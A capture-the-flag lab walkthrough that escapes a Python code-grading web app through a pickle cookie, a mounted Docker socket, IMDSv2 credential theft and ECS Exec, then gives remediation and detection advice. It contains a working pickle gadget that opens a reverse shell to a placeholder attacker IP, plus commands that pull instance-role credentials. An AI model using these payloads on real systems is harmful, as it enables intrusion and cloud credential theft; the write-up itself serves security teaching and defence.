# Code Judge Escape - Walkthrough

> **Security Note**: Use placeholders for all AWS Account IDs, Access Keys, and Secret Keys.
> - Account ID: `123456789012`
> - Access Key: `AKIAIOSFODNN7EXAMPLE` or `ASIAXXXXXXXXXXX`
> - Secret Key: `xxxxxxxx` or mask actual values

The scenario depicts a fictional company. All AWS Account IDs, IPs, and credentials shown in this document are placeholders (`123456789012`, `203.0.113.42`, `AKIAIOSFODNN7EXAMPLE`, etc.). Substitute your own values.

## Attack Path

```mermaid
flowchart TB
    A[Recon: nmap target IP] --> B[VulnBoard /submit + /result]
    B --> C[Pickle deserialization<br/>in result_cache cookie]
    C --> D[RCE inside VulnBoard container]
    D --> E[Discover /var/run/docker.sock]
    E --> F[Spawn host-network container<br/>via the socket]
    F --> G[IMDSv2 PUT token + GET creds]
    G --> H[aws sts get-caller-identity]
    H --> I[Enumerate ECS clusters & tasks]
    I --> J[ecs:ExecuteCommand into flag-vault]
    J --> K[FLAG]
```

## Summary

1. Port scan the target; only `8080/tcp` (VulnBoard) is exposed.
2. Submit code, watch the `Set-Cookie: result_cache=...` header, identify base64-encoded Python pickle bytes.
3. Craft a pickle gadget; recover an interactive shell inside the VulnBoard container.
4. Find `/var/run/docker.sock` bind-mounted into the container.
5. Use the socket to spawn an Alpine container on the **host network** so it can reach IMDSv2 with `hop_limit = 1`.
6. PUT a token to IMDSv2, GET temporary IAM credentials for the EC2 instance role.
7. Enumerate ECS; the role has `ecs:ExecuteCommand` left over from a retired platform tool.
8. `aws ecs execute-command` into the private `flag-vault` task and read `/app/data/flag.txt`.

---

## Step 1: Reconnaissance

You are handed `assets/target_info.txt`:

```text
Target IP : 203.0.113.42
Web URL   : http://203.0.113.42:8080
Region    : us-east-1
```

Confirm what is reachable:

```bash
TARGET=203.0.113.42
nmap -Pn -sV -p 1-10000 "${TARGET}"
```

Only `8080/tcp` answers (gunicorn). Open it in a browser - **VulnBoard - Beaver Recruit Inc.**, a Python coding-evaluation page.

## Step 2: Map the Application

Submit the default solution. The browser is redirected to `/result` and a green `100 / 100 - PASS` page appears.

Replay the flow with `curl -v` to see the cookie:

```bash
curl -s -i -X POST "http://${TARGET}:8080/submit" \
    --data-urlencode 'code=print("hi")' -o /tmp/r1.html -D /tmp/r1.hdr
grep -i set-cookie /tmp/r1.hdr
```

```text
Set-Cookie: result_cache=gASVKwAAAA...AGdQARgWNl...; HttpOnly; Path=/; Max-Age=600
```

That `gASV...` is a textbook signature: base64-decoded it begins with `\x80\x04\x95` -
the Python pickle protocol-4 framing.

```bash
echo 'gASVKw...' | base64 -d | xxd | head -2
# 00000000: 8004 9522 0000 0000 0000 008c 0b5f 5f6d  ...".......__m
```

The application is round-tripping a pickled object through a cookie. The result
page must be calling `pickle.loads()` on attacker-controlled bytes. That is the
exact pattern documented in [CVE-2021-33026](https://github.com/advisories/GHSA-656c-6cxf-hvcv).

## Step 3: Pickle Gadget for RCE

The classic `__reduce__` gadget gives any pickle implementation arbitrary
callable invocation on `loads`. Use it to land a reverse shell back to a
listener on your attacker box.

On the attacker:

```bash
# Replace with a reachable IP/port for your environment
ATTACKER=198.51.100.7
LPORT=4444
nc -lvnp ${LPORT}
```

Build the payload:

```bash
python3 - <<'PY'
import base64, pickle, os, sys
ATTACKER = "198.51.100.7"
LPORT = 4444

class Exploit:
    def __reduce__(self):
        cmd = f'sh -c "sh -i >& /dev/tcp/{ATTACKER}/{LPORT} 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
PY
```

Send it as the cookie to `/result`:

```bash
PAYLOAD='<paste payload>'
curl -s -o /dev/null "http://${TARGET}:8080/result" \
     -H "Cookie: result_cache=${PAYLOAD}"
```

The listener catches a shell. Confirm you are inside the VulnBoard container:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

hostname
# vulnboard

cat /etc/os-release | head -2
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
```

Yes - that is the Flask container, not the EC2 host.

## Step 4: Discover the Docker Socket

VulnBoard has to grade submissions somehow. Inspect what the container can talk to:

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root 999 0 May 18 12:34 /var/run/docker.sock
```

The socket is bind-mounted into the container. As an extra in-product hint
the `docker-compose.yml` is also available read-only:

```bash
cat /srv/docker-compose.yml
```

```yaml
services:
  vulnboard:
    image: vulnboard:latest
    ...
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /opt/vulnboard/docker-compose.yml:/srv/docker-compose.yml:ro
```

The container ships with the `docker` CLI (the runner uses it to launch
grading sandboxes), so no additional download is needed:

```bash
docker version
# Server: Docker Engine - Community
#  Version:    26.x
```

## Step 5: Reach IMDS Despite hop_limit = 1

The EC2 host has IMDSv2 enforced with `http_put_response_hop_limit = 1`. A
default bridge-network container therefore *cannot* reach IMDS - the
response TTL is decremented at the Docker bridge and dropped before it
reaches the container (see Datadog Security Labs' write-up on IMDS hop
limits).

But you have the host Docker daemon. Spawn a one-shot container with
`--network host` - that container shares the host's network namespace, so
`hop_limit = 1` is satisfied:

```bash
docker run --rm --network host alpine:3.19 sh -c '
  apk add --no-cache curl >/dev/null
  TOKEN=$(curl -fsS -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  ROLE=$(curl -fsS -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/)
  echo "[+] Role: $ROLE"
  curl -fsS -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
'
```

You receive temporary credentials:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2lu...EXAMPLE...",
  "Expiration": "2026-05-18T18:42:00Z"
}
```

Trail of Bits and Aqua AVD-KSV-0006 are the canonical references for why
`/var/run/docker.sock` is equivalent to host root - both apply here. We did
not need to break the sandbox, change capabilities, or use any kernel
exploit; mounting the socket alone is enough.

## Step 6: Configure the AWS CLI

Back on your attacking box:

```bash
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="IQoJb3JpZ2lu...EXAMPLE..."
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
```

```json
{
  "UserId": "AROAEXAMPLEEXAMPLEEX:i-0abcdef1234567890",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/gnawlab-codejudge-app-role-xxxxxxxx/i-0abcdef1234567890"
}
```

## Step 7: Enumerate the Role's Permissions

Use the role name from the assumed-role ARN:

```bash
ROLE_NAME=gnawlab-codejudge-app-role-xxxxxxxx
aws iam list-role-policies        --role-name "$ROLE_NAME"
aws iam list-attached-role-policies --role-name "$ROLE_NAME"
aws iam get-role-policy           --role-name "$ROLE_NAME" \
                                  --policy-name "$(aws iam list-role-policies --role-name "$ROLE_NAME" --query 'PolicyNames[0]' --output text)"
```

The inline policy contains `ec2:Describe*`, the full `ecs:List*/Describe*` set,
`ecs:ExecuteCommand`, and `ssmmessages:*`. That last pair - `ecs:ExecuteCommand`
plus the SSM Messages channel actions - is what makes ECS Exec sessions work.

This permission set looks excessive for a code-grading host. It is: in the
scenario story the platform team granted it during a 2023 self-service
deploy push that has since been retired, and the role was never trimmed.

## Step 8: Enumerate ECS

```bash
aws ecs list-clusters
# arn:aws:ecs:us-east-1:123456789012:cluster/gnawlab-codejudge-cluster-xxxxxxxx

CLUSTER=gnawlab-codejudge-cluster-xxxxxxxx

aws ecs list-tasks --cluster "$CLUSTER"
# arn:aws:ecs:us-east-1:123456789012:task/<cluster>/<task-id>

TASK=<task-id>
aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$TASK" \
  --query 'tasks[0].containers[].{name:name,health:healthStatus,managedAgents:managedAgents[*].name}'
```

```json
[
  {
    "name": "flag-vault",
    "health": "UNKNOWN",
    "managedAgents": ["ExecuteCommandAgent"]
  }
]
```

`ExecuteCommandAgent` confirms ECS Exec is enabled on this task.

## Step 9: Drop a Shell into flag-vault via ECS Exec

```bash
aws ecs execute-command \
  --cluster "$CLUSTER" \
  --task    "$TASK" \
  --container flag-vault \
  --interactive \
  --command "/bin/sh"
```

```text
Starting session with SessionId: ecs-execute-command-...
/ # cat /app/data/flag.txt
FLAG{pickle_to_docker_sock_to_imds_to_ecs_exec}
```

## Attack Chain Summary

```text
1. VulnBoard at http://<target>:8080
   v  Result page calls pickle.loads on the result_cache cookie
2. Pickle gadget RCE inside VulnBoard container (uid 0, but containerized)
   v  /var/run/docker.sock is bind-mounted from host
3. docker run --rm --network host alpine ...
   v  Host network namespace satisfies IMDSv2 hop_limit = 1
4. IMDSv2 PUT token + GET credentials
   v  Temporary creds for gnawlab-codejudge-app-role-xxxxxxxx
5. aws iam list/get-role-policy
   v  Inline policy includes ecs:ExecuteCommand + ssmmessages:*
6. aws ecs list-clusters / list-tasks / describe-tasks
   v  flag-vault task, ExecuteCommandAgent enabled
7. aws ecs execute-command --container flag-vault --command /bin/sh
   v
8. cat /app/data/flag.txt -> FLAG{pickle_to_docker_sock_to_imds_to_ecs_exec}
```

## Key Techniques

### Identifying Pickle in a Cookie

| Indicator | What it means |
|---|---|
| Base64 string begins with `gASV` or `gASF` (`\x80\x04` / `\x80\x05` framed) | Python pickle protocol 4 or 5 |
| Cookie called `*_cache`, `*_state`, `session`, `payload` | App is re-hydrating an object |
| Server-side framework is Flask + custom result class | JSON would have worked - they chose pickle for a reason |

### Reaching IMDS from a Container

| Container network | hop_limit = 1 | hop_limit = 2 |
|---|---|---|
| `bridge` (default) | response TTL=1 is dropped at docker0 | reachable |
| `host` | reachable (same netns) | reachable |
| `none` | unreachable | unreachable |

The lab is configured the AWS-recommended way (`hop_limit = 1`), so a generic
bridge-network sandbox cannot reach IMDS. The escape relies on
**`--network host` + docker.sock**, not on a misconfigured hop limit.

### Why ECS Exec Instead of Stealing the Task Role

You *could* try to steal the Fargate task role via `169.254.170.2/...` and the
`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` env var. But you do not have a
foothold inside the task - the task is in a private subnet and the only way
in is `ecs:ExecuteCommand`. The role you do have permits exactly that, so
that is the realistic path. (Reference: Wiz, "The Many Ways to Obtain
Credentials in AWS", 2024.)

## Lessons Learned

### 1. Pickle is not a serializer

`pickle.loads()` on attacker-controlled bytes is unconditional RCE. The
`SECURITY-142` TODO in this scenario - "migrate to signed JSON" - is the
correct fix. JSON for transport, an HMAC for integrity, never `pickle`.

### 2. docker.sock = root on the host

Aqua AVD-KSV-0006 and Trail of Bits both classify a mounted Docker socket
as equivalent to giving the workload root on the host. The grading-sandbox
use case is the textbook anti-pattern; alternatives include:

- **Run dind (Docker-in-Docker) as a side container** - isolation is still
  weaker than a separate host, but at least an escape lands you in dind, not on
  the EC2.
- **Use a remote build/run service** - e.g., AWS Batch, a dedicated Fargate
  task per submission, or [gVisor](https://gvisor.dev/) / Firecracker.
- **Air-gap the grader entirely** - reject the "spawn ephemeral container per
  submission" pattern, pre-compile a fixed sandbox image and `exec` into it.

### 3. IMDSv2 hop_limit alone is not enough

`hop_limit = 1` defeats container-from-bridge IMDS access, which is the
attack TeamTNT and similar actors used at scale. It does **not** defeat
`--network host`, kernel-level escapes, or `nsenter` after a sock-mount
breakout. Treat IMDS hardening as one layer, not the only layer.

### 4. IAM roles accrete; trim them

The `app-role` here has `ecs:ExecuteCommand` because of a tool that was
retired in 2024. The role was never trimmed. Use IAM Access Analyzer's
"unused permissions" findings and require a periodic re-justification of
each role's policy statements.

### 5. Why Fargate (not ECS on EC2)

If this scenario used ECS on EC2 launch type, the `ECScape` technique
(Naor Haziz, Black Hat USA 2025) would allow stealing credentials from
*other* tasks on the same host - a much bigger blast radius. Fargate's
per-task microVM isolation prevents that. AWS explicitly recommends
Fargate when you need task-level isolation; the lab follows that
recommendation by design.

## Remediation

### Safe replacement for the pickle cookie

```python
import hmac, hashlib, json, os

SIGNING_KEY = os.environ["RESULT_CACHE_KEY"].encode()

def encode(result: dict) -> str:
    body = json.dumps(result, separators=(",", ":")).encode()
    sig  = hmac.new(SIGNING_KEY, body, hashlib.sha256).hexdigest()
    return f"{sig}.{base64.urlsafe_b64encode(body).decode()}"

def decode(blob: str) -> dict:
    sig, body_b64 = blob.split(".", 1)
    body = base64.urlsafe_b64decode(body_b64.encode())
    expected = hmac.new(SIGNING_KEY, body, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("bad signature")
    return json.loads(body)
```

### Replace docker.sock with a per-submission Fargate task

```hcl
resource "aws_ecs_task_definition" "grader" {
  family       = "vulnboard-grader"
  network_mode = "awsvpc"
  requires_compatibilities = ["FARGATE"]
  ...
}
```

VulnBoard calls `ecs:RunTask` with the submission's code injected via task
overrides; the grader writes the result to S3; VulnBoard polls for it.
No host Docker daemon required.

### Trim the app role

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["ecs:RunTask"],
      "Resource": "arn:aws:ecs:us-east-1:123456789012:task-definition/vulnboard-grader:*"
    },
    {
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::123456789012:role/vulnboard-grader-task-role"
    }
  ]
}
```

No `ecs:ExecuteCommand`, no `ssmmessages:*`, no `ec2:Describe*`.

### Detection

- **CloudTrail**: alert on `ecs:ExecuteCommand` from any EC2 instance role.
- **GuardDuty**: enable Runtime Monitoring for ECS / EC2 - it flags the
  `docker run --network host` escape pattern.
- **VPC Flow Logs**: a 169.254.169.254 connection originating from a workload
  network namespace is rare; alert on it.
